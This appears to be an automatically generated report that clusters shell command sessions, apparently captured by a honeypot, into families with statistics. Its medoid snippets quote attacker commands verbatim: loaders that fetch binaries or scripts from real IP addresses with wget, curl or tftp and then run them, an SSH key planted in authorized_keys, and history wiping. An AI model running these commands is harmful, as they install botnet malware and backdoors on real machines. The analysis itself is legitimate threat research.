# FS Families Report

## Family 6

Size: **15**, mean_FS: **0.866**, sd_FS: **0.098**  
Medoid: `fi_hash=0e2f33f329730941` (session `0116d3b3fd92`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.31.98.109/ugotnulled.sh; curl -O http://194.31.98.109/ugotnulled.sh; chmod 777 ugotnulled.sh; sh ugotnulled.sh; tftp 194.31.98.109 -c get ugotnulled.sh; chmod 777 ugotnulled.sh; sh ugotnull ...
```

Consensus (op, conn) pairs:

```python
[('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';')]
```

Top operators: [('cd', 69), ('sh', 56), ('chmod', 45), ('tftp', 30), ('rm', 25), ('wget', 15), ('ftpget', 11), ('curl', 10), ('cat', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 072e41e139896353 | 21f9712e4107 |        1 |
| 0e2f33f329730941 | 0116d3b3fd92 |        1 |
| 13d8841f330b058a | 4210ea9d0a7f |        1 |
| 160f60200a5f9040 | 004724000d7b |        1 |
| 4f51a31c6d27eada | 0320467b5870 |        1 |

## Family 35

Size: **13**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=153fd69fc12292c2` (session `a4f2f6bffb87`, n_rows=1)  

**Medoid commands (snippet):**

```bash
echo
```

Consensus (op, conn) pairs:

```python
[('echo', 'EOS')]
```

Top operators: [('echo', 13)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 153fd69fc12292c2 | a4f2f6bffb87 |        1 |
| 68f6c6f806255ef3 | ef125c2c2bd8 |        1 |
| 85e4114ad450ace6 | 006c4a5ac3ca |        1 |
| 93fed83b04bf1220 | 365f503c2386 |        1 |
| a5b2e002ac0fcb8a | 000b5a1e7c5f |        1 |

## Family 80

Size: **13**, mean_FS: **0.919**, sd_FS: **0.035**  
Medoid: `fi_hash=0fbbb73a992a1549` (session `017d8469dfc2`, n_rows=11)  

**Medoid commands (snippet):**

```bash
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRBiyqk8SLD3ijQpfZwQ9vsHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZGr/Pg4+kqJ0gLyqYm ...
```

Consensus (op, conn) pairs:

```python
[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('cd', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';')]
```

Top operators: [('cp', 324), ('chmod', 228), ('cd', 133), ('rm', 121), ('>', 114), ('echo', 24), ('wget', 17), ('mkdir', 13), ('busybox', 10), ('PH_EXEC_1', 6)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0fbbb73a992a1549 | 017d8469dfc2 |       11 |
| 147e677e1f8e1d30 | 03775a9e4596 |       10 |
| 2947edaad3d01fd2 | 00f129445d35 |       11 |
| 35099ce94b4af86a | 00649b552b39 |       10 |
| 5aae2bd4f720f0b6 | 0074affed919 |       10 |

## Family 15

Size: **11**, mean_FS: **0.856**, sd_FS: **0.083**  
Medoid: `fi_hash=d23cce656fcbd960` (session `1cf335d00634`, n_rows=11)  

**Medoid commands (snippet):**

```bash
mkdir /home/; mount -o remount, rw /home/; cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d
mkdir /tmp/; mount -o remount, rw /tmp/; cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp ...
```

Consensus (op, conn) pairs:

```python
[('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';')]
```

Top operators: [('cp', 279), ('chmod', 191), ('cd', 103), ('>', 99), ('mkdir', 98), ('rm', 98), ('mount', 93), ('busybox', 28), ('wget', 17), ('wd1', 17)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 1220486b533062b4 | 95b98c2ea89c |        8 |
| 129140798a789be8 | 226aaab83a1d |        9 |
| 306b95037f63a6e8 | ab8505f6d099 |       12 |
| 5e1318289a0eede4 | 0021f2c9d4f2 |       15 |
| 6afafcdfbfcf031f | 1239c85f549c |       10 |

## Family 68

Size: **10**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=137a14b5e9787ebc` (session `b337ba03a3af`, n_rows=1)  

**Medoid commands (snippet):**

```bash
/bin/busybox VlRuNDDJ
```

Consensus (op, conn) pairs:

```python
[('busybox', 'EOS')]
```

Top operators: [('busybox', 10)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 137a14b5e9787ebc | b337ba03a3af |        1 |
| 233e81b1ca7b25b4 | 0bbb0ab48683 |        1 |
| 69b20de348682614 | 6940d25c3b27 |        1 |
| 850ea03dbb90ce91 | 577bfec8974c |        1 |
| ab6cc083152ae1ab | 8952dfde80da |        1 |

## Family 87

Size: **9**, mean_FS: **0.966**, sd_FS: **0.028**  
Medoid: `fi_hash=7fef9be56d5dd1a7` (session `032039c09cf5`, n_rows=72)  

**Medoid commands (snippet):**

```bash
enable
system
shell
sh
linuxshell
cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
rm -rf sh; wget http://179.43.156.214/sh || curl -O http://179.43.156.214/sh || tftp 179.43.156.214 -c get sh || tftp -g -r sh 179.43.156.214; chmod 777 s ...
```

Consensus (op, conn) pairs:

```python
[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('linuxshell', ';'), ('cd', ';'), ('rm', ';'), ('wget', '||'), ('curl', '||'), ('tftp', '||'), ('tftp', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('rm', ';'), ('read', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('chmod', ';'), ('PH_EXEC_2', ';'), ('chmod', ';'), ('PH_EXEC_3', ';'), ('rm', ';'), ('rm', 'EOS')]
```

Top operators: [('echo', 575), ('rm', 63), ('chmod', 27), ('tftp', 18), ('cd', 16), ('cat', 13), ('enable', 9), ('system', 9), ('shell', 9), ('sh', 9)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 2f587720e0e4fa7c | 0345ed3fbf9d |       72 |
| 3f8a53da62034e4e | 8d15d2743cfb |       72 |
| 4607c6a22ae1bb5d | 28af52968642 |       72 |
| 65a69ec388ad6ab8 | a665c3365113 |       72 |
| 68d07b56fce54f05 | 1ef53df25795 |       72 |

## Family 20

Size: **8**, mean_FS: **0.903**, sd_FS: **0.057**  
Medoid: `fi_hash=2b5150c23e9a475b` (session `47d4dcea00e5`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://46.19.141.122/bins/x86; cat x86 > snort; chmod 777 snort; chmod +x snort; ./snort rooted.x86; history -c
```

Consensus (op, conn) pairs:

```python
[('cat', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('cat', ';'), ('chmod', ';')]
```

Top operators: [('cd', 40), ('cat', 16), ('chmod', 12), ('wget', 8), ('PH_EXEC_1', 7), ('history', 7), ('sh', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 2b5150c23e9a475b | 47d4dcea00e5 |        1 |
| 5132f82d03311d29 | 06044a01cabe |        1 |
| 69389df6348c3521 | 1e2b13931f8f |        1 |
| 69765b4232307f30 | 30e1b066ae93 |        1 |
| 7879301414703b7b | 0789f36e6d5a |        1 |

## Family 34

Size: **8**, mean_FS: **0.893**, sd_FS: **0.064**  
Medoid: `fi_hash=b45528be915a36a4` (session `2f53b7e9711c`, n_rows=6)  

**Medoid commands (snippet):**

```bash
cat /bin/echo
cat /proc/mounts
echo -e '\\x4d\\x4f\\x55\\x4e\\x54\\x53\\x5f\\x44\\x4f\\x4e\\x45'
rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f
wget --help>/dev/null && echo -en '\\x57\\x47\\x4 ...
```

Consensus (op, conn) pairs:

```python
[('cat', ';'), ('rm', ';'), ('rm', ';'), ('>', ';'), ('chmod', '||'), ('cp', ';'), ('>', ';'), ('cp', ';'), ('wget', '&&'), ('echo', ';'), ('curl', '&&'), ('echo', ';'), ('echo', ';'), ('cd', ';'), ('wget', ';'), ('PH_EXEC_1', ';'), ('>', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 40), ('>', 24), ('rm', 19), ('cp', 16), ('wget', 16), ('cat', 14), ('chmod', 8), ('curl', 8), ('cd', 8), ('PH_EXEC_1', 8)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 03fac12c88c2c3a9 | 3b87f1bc1d89 |        6 |
| 157db74956651e95 | 0014de2de957 |        7 |
| 5c266d1a1aea2250 | ae7fae310373 |        5 |
| 9bac03294626e400 | 066e9f56c0f2 |        4 |
| 9c68a6654b3d0edc | 5022825ef792 |        4 |

## Family 56

Size: **7**, mean_FS: **0.952**, sd_FS: **0.032**  
Medoid: `fi_hash=1dcdd0685e28acdb` (session `014e3dedb2ac`, n_rows=7)  

**Medoid commands (snippet):**

```bash
enable
system
shell
sh
linuxshell
cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
rm -rf nig; rm -rf miori.*; wget http://109.206.241.34/nig || curl -O http://109.206.241.34/nig || tftp 109.206.241.34 -c get nig || tftp -g -r nig 109.20 ...
```

Consensus (op, conn) pairs:

```python
[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('linuxshell', ';'), ('cd', ';'), ('echo', ';'), ('cat', ';'), ('rm', ';'), ('rm', ';'), ('curl', '||'), ('tftp', '||'), ('tftp', ';'), ('chmod', ';'), ('rm', 'EOS')]
```

Top operators: [('rm', 25), ('tftp', 14), ('enable', 7), ('system', 7), ('shell', 7), ('sh', 7), ('linuxshell', 7), ('cd', 7), ('echo', 7), ('cat', 7)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0bea3767b5ae49f3 | 891d0e4f7cd9 |        7 |
| 1dcdd0685e28acdb | 014e3dedb2ac |        7 |
| 92744f71567e0993 | 29bfe2b754c1 |        7 |
| c6cb0ce1370e95d2 | fb8a44e33697 |        7 |
| d4ba4661a3bea579 | 872cd91aa4e6 |        7 |

## Family 126

Size: **7**, mean_FS: **0.911**, sd_FS: **0.052**  
Medoid: `fi_hash=a94b10e419c5761d` (session `00b51867d764`, n_rows=15)  

**Medoid commands (snippet):**

```bash
>/tmp/.l && cd /tmp/; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x4e\\x45' || ./helloworld
>/var/.l && cd /var/; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x4e\\x45' || ./helloworld
>/dev/.l && cd /dev/; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x ...
```

Consensus (op, conn) pairs:

```python
[('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('wget', ';')]
```

Top operators: [('echo', 106), ('>', 97), ('cd', 97), ('PH_EXEC_1', 97), ('wget', 10), ('chmod', 7), ('PH_EXEC_2', 7), ('curl', 5), ('ftpget', 4)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 1b91dd9f52578d30 | 007e8eeda9f7 |       15 |
| 4790e02687075392 | 00cd5205709e |       16 |
| a94b10e419c5761d | 00b51867d764 |       15 |
| ad001613b1b08750 | 39bac95869fe |       16 |
| b991ffc89305c4d1 | d284b2652491 |       16 |

## Family 63

Size: **7**, mean_FS: **0.894**, sd_FS: **0.076**  
Medoid: `fi_hash=23e0e33ee2365c00` (session `2565ffa16aa3`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp; rm -rf 351*; wget http://45.67.230.216/351.sh; curl -O http://45.67.230.216/351.sh; chmod 777 351.sh; ./351.sh server; sh 351.sh server
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('rm', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';')]
```

Top operators: [('rm', 8), ('cd', 7), ('wget', 7), ('curl', 7), ('chmod', 7), ('sh', 6), ('PH_EXEC_1', 6)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0340b77655fb77e6 | d24e39b00c58 |        1 |
| 23e0e33ee2365c00 | 2565ffa16aa3 |        1 |
| 5f8068943c522d86 | 2733ee670972 |        1 |
| 95f0e497528dcc7f | a1ac0b0a3bed |        1 |
| de688bb2d79b4239 | 01574baf0922 |        1 |

## Family 16

Size: **7**, mean_FS: **0.863**, sd_FS: **0.065**  
Medoid: `fi_hash=9782fb0385ecb7c3` (session `0b9d4bea29cd`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp; wget http://208.115.245.158/c --no-check-certificate; curl -O http://208.115.245.158/c; chmod 777 c*; ./c; rm -rf -c*; history -c
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('chmod', ';'), ('rm', ';'), ('history', 'EOS')]
```

Top operators: [('cd', 7), ('wget', 7), ('chmod', 7), ('rm', 7), ('history', 7), ('curl', 5), ('PH_EXEC_1', 3), ('sh', 2), ('PH_EXEC_2', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0129d0d0e783bb89 | 60a7ef53c929 |        1 |
| 7aff857af4b5e2d7 | 12fe283eb1a7 |        1 |
| 9782fb0385ecb7c3 | 0b9d4bea29cd |        1 |
| 9e130f6dca55feed | 02884fb5757e |        1 |
| aa477422835de6d2 | f504ac5b4bc1 |        1 |

## Family 42

Size: **6**, mean_FS: **0.904**, sd_FS: **0.044**  
Medoid: `fi_hash=ee897c29a7e47b34` (session `01a461e2cb69`, n_rows=4)  

**Medoid commands (snippet):**

```bash
cat /bin/echo
echo -e '\\x4d\\x4f\\x55\\x4e\\x54\\x53\\x5f\\x44\\x4f\\x4e\\x45'
rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f
wget --help>/dev/null && echo -en '\\x57\\x47\\x45\\x54'; curl --h ...
```

Consensus (op, conn) pairs:

```python
[('rm', ';'), ('rm', ';'), ('>', ';'), ('chmod', '||'), ('cp', ';'), ('>', ';'), ('cp', ';'), ('wget', '&&'), ('echo', ';'), ('curl', '&&'), ('echo', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 21), ('rm', 12), ('>', 12), ('cp', 12), ('cat', 6), ('chmod', 6), ('wget', 6), ('curl', 6)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 3ff09cce647fddba | 2c27c3fc493f |        4 |
| 7eb4acb930e96b1a | b3d369acf5d3 |        2 |
| 97d1fa3a8e8555e6 | 27fd1ce5c734 |        5 |
| a6c51b61ce6965cc | 6ce4a2436100 |        3 |
| b0fbabedf3d7a047 | 02fd6538c4b3 |        3 |

## Family 4

Size: **6**, mean_FS: **0.870**, sd_FS: **0.097**  
Medoid: `fi_hash=15c5aa567680fe3f` (session `0f3193356d71`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp; wget http://45.95.169.143/The420smokeplace.dns/KKveTTgaAAsecNNaaaa.x86; chmod 777 *; ./KKveTTgaAAsecNNaaaa.x86 mServ.x86
```

Consensus (op, conn) pairs:

```python
[('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', 'EOS')]
```

Top operators: [('wget', 6), ('chmod', 6), ('PH_EXEC_1', 6), ('cd', 4), ('curl', 2), ('cat', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 15c5aa567680fe3f | 0f3193356d71 |        1 |
| 17da5004e3814c2c | 059398cc507e |        1 |
| 18356361a1dddb83 | 123ae0e871e7 |        2 |
| 6822e92a8fe4105c | 056e4f509548 |        1 |
| 763e124e45ea9ea0 | 0c3ef147ed29 |        1 |

## Family 13

Size: **6**, mean_FS: **0.811**, sd_FS: **0.084**  
Medoid: `fi_hash=bea83e007b343ce1` (session `39667ee28645`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.88.67.38/ssh; chmod 777 ssh; ./ssh
```

Consensus (op, conn) pairs:

```python
[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';')]
```

Top operators: [('cd', 30), ('wget', 6), ('chmod', 6), ('PH_EXEC_1', 4), ('curl', 3), ('cat', 2), ('sh', 2), ('busybox', 1), ('rm', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 07bd508e2030d314 | b2c31c852fa2 |        1 |
| 2f972fb00661f35a | 1ff022ce20a1 |        1 |
| 7e99b733f7f79161 | 183f21cd812d |        1 |
| bea83e007b343ce1 | 39667ee28645 |        1 |
| c11e3d0826ebb5a1 | 5eb2e81e9557 |        1 |

## Family 72

Size: **5**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=146bfbf4066fd438` (session `00117c1977cb`, n_rows=1)  

**Medoid commands (snippet):**

```bash
uname -a
```

Consensus (op, conn) pairs:

```python
[('uname', 'EOS')]
```

Top operators: [('uname', 5)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 146bfbf4066fd438 | 00117c1977cb |        1 |
| 6a635bbaefaefcda | a6091cb4ec61 |        1 |
| 957486edab6b568b | 253e01cba095 |        1 |
| c1f4de5103d6ebc1 | 002c5fe7ebb8 |        1 |
| ca7599047742b99a | feef1d1794fa |        1 |

## Family 82

Size: **5**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=1e680edfe40ad4e0` (session `2037c8821ed8`, n_rows=1)  

**Medoid commands (snippet):**

```bash
chmod +x ./.70315909868208763/xinetd; nohup ./.70315909868208763/xinetd 174.138.30.216 27.102.127.109 203.145.143.133 138.36.82.4 121.5.108.122 91.232.29.174 138.185.197.214 31.42.177.207 51.68.199.104 92.51.194.62 38.64.92.78 103.156.242.163 194.32.78.170 193 ...
```

Consensus (op, conn) pairs:

```python
[('chmod', ';'), ('nohup', 'EOS')]
```

Top operators: [('chmod', 5), ('nohup', 5)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 1e680edfe40ad4e0 | 2037c8821ed8 |        1 |
| 88cd050c8a109e5a | bacf3218ee35 |        1 |
| 95eb90baad190f75 | d04156b1daa3 |        1 |
| b1ed5b9047a6a2dc | 6b6a0332b538 |        1 |
| ea19e5a56a722ab2 | 1c2de7b53f35 |        1 |

## Family 19

Size: **5**, mean_FS: **0.933**, sd_FS: **0.082**  
Medoid: `fi_hash=79c8a42fcec84e2f` (session `154dac9a8944`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget 23.94.22.13/x86; chmod 777 x86; ./x86 nigga
```

Consensus (op, conn) pairs:

```python
[('wget', ';'), ('chmod', ';')]
```

Top operators: [('wget', 5), ('chmod', 5), ('PH_EXEC_1', 4), ('sh', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 79c8a42fcec84e2f | 154dac9a8944 |        1 |
| 92e509da490b4358 | f7131b49b4ff |        1 |
| 9ea52d3d15b2f6e5 | 1cb7b2b84ea9 |        1 |
| c69edbb1137f7511 | e0d14d68e2f3 |        1 |
| f8317383f3e4d1b7 | 813f0b4fc21c |        1 |

## Family 133

Size: **5**, mean_FS: **0.902**, sd_FS: **0.041**  
Medoid: `fi_hash=b940cff000db9189` (session `00a6a24d8f0a`, n_rows=3)  

**Medoid commands (snippet):**

```bash
cat /bin/echo
wget --help>/dev/null && echo -en '\\x57\\x47\\x45\\x54'; curl --help>/dev/null && echo -en '\\x43\\x55\\x52\\x4c'; echo -en '\\x67\\x61\\x79\\x66\\x67\\x74'
cd /dev; wget http://95.214.27.202/x86 -O- >.f; ./.f ssh.wget.x86; >.f; echo rppr
```

Consensus (op, conn) pairs:

```python
[('wget', '&&'), ('echo', ';'), ('curl', '&&'), ('echo', ';'), ('echo', ';'), ('cd', ';'), ('wget', ';'), ('PH_EXEC_1', ';'), ('>', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 22), ('wget', 10), ('curl', 5), ('cd', 5), ('PH_EXEC_1', 5), ('>', 5), ('cat', 4)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 61896b121ef63522 | 05a6167d8f55 |        4 |
| b940cff000db9189 | 00a6a24d8f0a |        3 |
| c763e5c22e4cfd10 | 5c6813116db3 |        4 |
| ede1b993f929b450 | 5c130b9cfbe4 |        2 |
| f21193be09c1c492 | a177ee8083e6 |        3 |

## Family 36

Size: **5**, mean_FS: **0.902**, sd_FS: **0.053**  
Medoid: `fi_hash=c6283309362220fe` (session `0f6ab481cff0`, n_rows=13)  

**Medoid commands (snippet):**

```bash
cd ~; chattr -ia .ssh; lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgT ...
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('whoami', ';'), ('lscpu', '|'), ('grep', ';'), ('df', '|'), ('head', '|'), ('awk', 'EOS')]
```

Top operators: [('grep', 16), ('cd', 15), ('uname', 15), ('awk', 6), ('chattr', 5), ('lockr', 5), ('rm', 5), ('mkdir', 5), ('echo', 5), ('chmod', 5)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 8ec4f4c65c95a841 | 817d981b3fe8 |       14 |
| a40f648bdd4fa218 | 34ed56bb02b0 |       11 |
| c6283309362220fe | 0f6ab481cff0 |       13 |
| cf80dfb5b9d87374 | 1dea3303c17a |       15 |
| fb5dfbac6230a541 | 4c3099f53c1c |       12 |

## Family 32

Size: **5**, mean_FS: **0.856**, sd_FS: **0.064**  
Medoid: `fi_hash=f00e6051435ab5e2` (session `8d3293ea4bec`, n_rows=17)  

**Medoid commands (snippet):**

```bash
cat /proc/mounts
>/tmp/.b && cd /tmp
>/dev/.b && cd /dev
>/tmp/.b && cd /tmp
>/dev/.b && cd /dev
>//.a && cd /
>/proc/.a && cd /proc
>/dev/.a && cd /dev
>/run/.a && cd /run
>//.a && cd /
>/dev/shm/.a && cd /dev/shm
>/proc/sys/fs/binfmt_misc/.a && cd /proc/sys/ ...
```

Consensus (op, conn) pairs:

```python
[('cat', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&')]
```

Top operators: [('>', 78), ('cd', 78), ('wget', 8), ('curl', 6), ('cat', 5), ('ftpget', 4), ('echo', 4), ('chmod', 2), ('PH_EXEC_1', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 06f30bfde02fe2fc | d326a14119a9 |       16 |
| 407d13a7039383bf | 4d37cb2988e5 |       20 |
| 437a75963ddbc64a | 992fb26fa951 |       18 |
| c029d11d82d5323d | 1ab555a5f441 |       18 |
| f00e6051435ab5e2 | 8d3293ea4bec |       17 |

## Family 100

Size: **4**, mean_FS: **0.938**, sd_FS: **0.062**  
